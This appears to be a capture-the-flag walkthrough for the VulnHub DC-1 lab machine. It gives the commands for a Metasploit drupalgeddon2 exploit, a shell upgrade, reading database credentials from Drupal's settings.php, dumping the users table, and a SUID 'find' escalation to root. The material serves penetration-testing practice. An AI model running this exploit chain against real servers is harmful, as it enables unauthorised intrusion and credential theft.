# DC-1-Vulnhub-Walkthrough
DC-1 is a beginner-friendly CTF-style virtual machine available on VulnHub (https://vulnhub.com/), designed to help users practice penetration testing and privilege escalation techniques. In this walkthrough, we explore how to enumerate the target, identify vulnerabilities, and exploit them to gain root access.  

# SCANNING

```nmap -sV -A -sC -p- [ Target IP ]```  

![Screenshot From 2025-02-26 21-24-56](https://github.com/user-attachments/assets/07adafad-171a-4d44-985b-38d884a9fc6e)

# EXPLOITATION 
Open metasploit  

![Pasted image](https://github.com/user-attachments/assets/f768ac0c-5c6a-4995-89f0-51436cc8982b)

#
Search for drupal  

```use exploit/unix/webapp/drupal_drupalgeddon2```  

![Screenshot From 2025-02-26 21-46-22](https://github.com/user-attachments/assets/905ce6c5-8237-46e7-9b9c-bf8e5c0cc806)  

```show options```  

![Screenshot From 2025-02-26 21-48-18](https://github.com/user-attachments/assets/fa3279b9-7e5b-4a72-ab19-ee8da17d2ad0)

```set RHOSTS [Target IP]```  

AND  

```exploit ``` or ```run```  

![Screenshot From 2025-02-26 21-48-34](https://github.com/user-attachments/assets/760fd810-b62a-4d87-8f8a-a0c8030155be)  

As you can see the meterpreter session was opened  
Check for system information using ```sysinfo```  
Open the command shell by typing ```shell```  

![Screenshot From 2025-02-26 21-49-02](https://github.com/user-attachments/assets/3cb1b675-f409-49c0-81f4-207a5b9108f5)  

```ls```  
```cat flag1.txt```  

![Screenshot From 2025-02-26 21-51-55](https://github.com/user-attachments/assets/8fe976b6-feca-4ac0-849f-14029fa3df5c)   
#  

**Flag 1 - "Every good CMS needs a config file - and so do you."**  

#  


Open bash SHELL ``` pyhton -c "import pty; pty.spawn('/bin/bash')"```  

![Screenshot From 2025-02-26 21-55-44](https://github.com/user-attachments/assets/447f185d-97f6-47ca-b524-cefd7e8bdb66)  

Locate drupal config-file ``` sites/default/settings.php ```  

![Screenshot From 2025-02-26 22-01-02](https://github.com/user-attachments/assets/60e3b929-4607-4126-bd61-82493ea79eb1)  

#  
**Flag 2 - Brute force and dictionary attacks aren't the only ways to gain access (and you will need access). What can you do with these credentials?**  

**database => 'drupaldb'**  
**username => 'dbuser'**  
**password => 'R0ck3t'**  

#  
loginto mysql ```mysql -u dbuser -p ```  
for password ```R0ck3t```  

![Screenshot From 2025-02-26 22-02-39](https://github.com/user-attachments/assets/12571a7a-eec7-4df5-abcd-5d6e254afd07)  

let's dive into some sql codes  

```show databases;```
```use drupaldb```  

![Screenshot From 2025-02-26 22-04-05](https://github.com/user-attachments/assets/9be04aa5-15d1-478f-b077-9211527a0cf7)  

```show tables```  

![Screenshot From 2025-02-26 22-04-35](https://github.com/user-attachments/assets/c7a184ad-e72f-434d-b971-0f0545dacc27)  

```select * from users```  

![Screenshot From 2025-02-26 22-05-23](https://github.com/user-attachments/assets/98842925-9174-47a1-b243-d1bad7671614)  

![Screenshot From 2025-02-26 22-07-06](https://github.com/user-attachments/assets/d160930a-1d84-46c2-b779-e287883dc18e)  
#  

# PRIVILEGE ESCALATION  

Go to GTFOBins and search 'find'  

![Screenshot From 2025-02-26 22-13-44](https://github.com/user-attachments/assets/58b3c71b-4e40-47e3-a871-8e6a951666e6)  

```find . -exec /bin/sh \;```  

![Screenshot From 2025-02-26 22-14-46](https://github.com/user-attachments/assets/6a10782d-097d-453d-857b-dad2165dee25)  


Here we go; We got the **ROOT**  

![Screenshot From 2025-02-26 22-15-13](https://github.com/user-attachments/assets/020649bc-4162-4eec-99fb-4ef286300ec4)  

```cd /root```  
```ls```  
```cat thefinalflag.txt```  


![Screenshot From 2025-02-26 22-16-18](https://github.com/user-attachments/assets/5887fc34-cf41-4dce-8c06-bd24c56b3ace)  

#  
**Flag 3**   


**Well done!!!  
Hopefully you've enjoyed this and learned some new skills.  
You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7**  

#
































